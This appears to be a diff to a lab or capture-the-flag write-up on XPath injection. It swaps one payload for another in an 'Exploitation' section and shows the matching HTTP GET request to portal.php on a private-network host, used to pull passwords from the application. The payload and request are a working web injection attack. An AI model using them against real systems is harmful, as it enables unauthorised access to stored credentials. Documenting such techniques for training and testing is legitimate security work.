@@ -84,12 +84,12 @@ XML Error; No car' entity found<br />
 
 ### Exploitation
 
-Send the payload `')]/password+|+a[contains+(a,'` to extract passwords from the application.
+Send the payload `')]+|+//password%00` to extract passwords from the application.
 
 #### Request
 
 ```text
-GET /portal.php?work=car')]/password+|+a[contains+(a,'&action=search HTTP/1.1
+GET /portal.php?work=car')]+|+//password%00&action=search HTTP/1.1
 Host: 192.168.196.202
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
